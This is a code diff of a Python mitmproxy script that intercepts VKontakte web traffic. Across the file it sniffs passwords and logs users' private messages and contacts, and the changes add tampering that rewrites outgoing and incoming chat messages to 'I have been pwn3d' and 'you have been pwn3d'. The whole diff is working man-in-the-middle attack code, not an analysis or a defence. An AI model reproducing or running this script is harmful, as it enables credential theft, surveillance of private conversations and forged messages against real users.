@@ -24,7 +24,7 @@ class VK_user:
                 s += hs + "  |  "
             s += "\n"
         s += "\n"
-        s += "| User".ljust(20)+"| Topic".ljust(20)+"| Message".ljust(20)+'\n'
+        s += "| toUser".ljust(20)+"| Topic".ljust(20)+"| Message".ljust(20)+'\n'
         for m in self.messages:
             s += str(m[1]).ljust(20) + str(m[2]).ljust(20) + str(m[0]).ljust(20) + "\n"
         s += "\n"
@@ -41,7 +41,7 @@ class VK_data:
         m = re.match(r"act=a_typing&al=(?P<al>\d+)&gid=(?P<gid>\d+)&hash=(?P<hash>\w+)&peer=(?P<peer>\d+)", string)
         if not m:
             logging.debug("from_a_typing: Failed to parse " + string)
-            return 0
+            return [0]
 
         logging.debug("Typing: al = " + m.group('al') + " gid = " + m.group('gid') + 
                       " hash = " + m.group('hash') + " peer = " + m.group('peer'))
@@ -50,7 +50,7 @@ class VK_data:
             self.users[self.current_user].peers[m.group('peer')] = Set([])
         self.users[self.current_user].peers[m.group('peer')].add(m.group('hash'))
  
-        return 1
+        return [1]
 
         
     def from_a_send(self, string):
@@ -60,7 +60,7 @@ class VK_data:
               "&to=(?P<to>\d+)&ts=(?P<ts>\d+)"), string, re.UNICODE)
         if not m:
             logging.debug(string)
-            return 0
+            return [0, string]
 
         logging.debug("al = " + m.group('al'))
         logging.debug("gid = " + m.group('gid'))
@@ -80,68 +80,81 @@ class VK_data:
 
         logging.debug(str(self.users[self.current_user]))
 
-        return 1
+        # Substitute message
+        string_ = ("act=a_send&al="+m.group('al')+"&gid="+m.group('gid')+"&guid="+
+                  m.group('guid')+"&hash="+m.group('hash')+"&media="+m.group('media')+
+                  "&msg="+"I have been pwn3d"+"&title="+m.group('title')+
+                  "&to="+m.group('to')+"&ts="+m.group('ts'))
+
+        return [2, string_]
 
     def from_a_check(self, string):
         m_key = re.match(r"act=a_check&key=[\w\W]*", string, re.UNICODE)
         m_id  = re.match(r"act=a_check&id=(?P<id>\d+)&[\w\W]*", string, re.UNICODE)
 
         if m_key:
-            return 1
+            return [1]
 
         if m_id:
             logging.debug("[a_check]: Found my id: " + m_id.group('id'))
             self.on_new_id(m_id.group('id'))
-            return 1
+            return [1]
         
         logging.debug(string)
-        return 0
+        return [0]
 
-    def decode(self, string):
+    def decode_request(self, string):
         try:
             string = urllib.unquote(string).decode('utf-8')
         except:
             pass
         m = re.match(r"act=(?P<type>\w+)&\w+", string)
         if not m:
-            return 0
+            return [0]
         
         if m.group('type') == "a_typing":
             return self.from_a_typing(string)
 
         if m.group('type') == "a_send":
             return self.from_a_send(string)
-        
+
         if m.group('type') == "a_check":
             return self.from_a_check(string)
         
         # No-info types
         if m.group('type') == "login":
-            return 1
+            return [1]
         
         if m.group('type') == "pad":
-            return 1
+            return [1]
         
         if m.group('type') == "a_friends":
-            return 1
+            return [1]
         
         if m.group('type') == "a_onlines":
-            return 1
+            return [1]
+
+        if m.group('type') == "a_release":
+            return [1]
+
+        if m.group('type') == "a_get_fast_chat":
+            return [1]
 
         logging.debug("Unable to decode type " + m.group('type') 
                       + "! " + string)
-        return 0
+        return [0]
 
     def decode_response(self, string):
-        m = re.match(r"\{\"ts\":\d+,\"updates\":[\w\W]+,\"(?P<msg>[\w\W]+)\",\{\}[\w\W]*\}", string)
-    
+        m = re.match(r"\{\"ts\":(?P<num>\d+),\"updates\":(?P<lstring>[\w\W]+),\"(?P<msg>[\w\W]+)\",\{\}(?P<rstring>[\w\W]*)\}", string)
+        
         if not m:
-            #logging.debug(string)
-            return
+            return [0]
 
         self.users[self.current_user].messages.append([m.group('msg'), str(self.users[self.current_user].id), "-"])
         logging.debug(str(self.users[self.current_user]))
- 
+
+        string_ = "{\"ts\":"+m.group('num')+",\"updates\":"+m.group('lstring')+",\""+"you have been pwn3d"+"\",{}"+m.group('rstring')+"}"
+        return [2, string_]
 
     def on_new_id(self, my_id):
         if my_id not in self.users.keys():
@@ -214,7 +227,7 @@ class PW_data:
         s = '\n'
         s += "website".ljust(30) + "login".ljust(30) + "password".ljust(20) + '\n'
         for entry in self.passwords:
-            if len(entry) == 3:
+            if (len(entry) == 3):
                 s += entry[0].ljust(30)+entry[1].ljust(30)+entry[2].ljust(20) + '\n'
             else:
                 s += entry[0] + '\n'
@@ -226,15 +239,13 @@ vk_db = VK_data()
 pw_db = PW_data()
 
 
-
 def request(context, flow):
     try:
         with decoded(flow.request):  # automatically decode gzipped responses.
-            #logging.debug(str(flow.request.url))
-            #logging.debug(str(flow.request.host))
-
             pw_db.sniff_passwords(str(flow.request.content))
-            vk_db.decode(str(flow.request.content))
+            result = vk_db.decode_request(str(flow.request.content))
+            if (result[0] == 2):
+                flow.request.content = result[1]
 
     except Exception as e:
         logging.debug(e)
@@ -242,9 +253,10 @@ def request(context, flow):
 def response(context, flow):
     try:
         with decoded(flow.response): # automatically decode gzipped responses.
-            #vk_db.decode(str(flow.response.content))
-            vk_db.decode_response(str(flow.response.content))
-
+            result = vk_db.decode_response(str(flow.response.content))
+            if (result[0] == 2):
+                flow.response.content = result[1]
+                                                    
     except Exception as e:
         logging.debug(e)
 
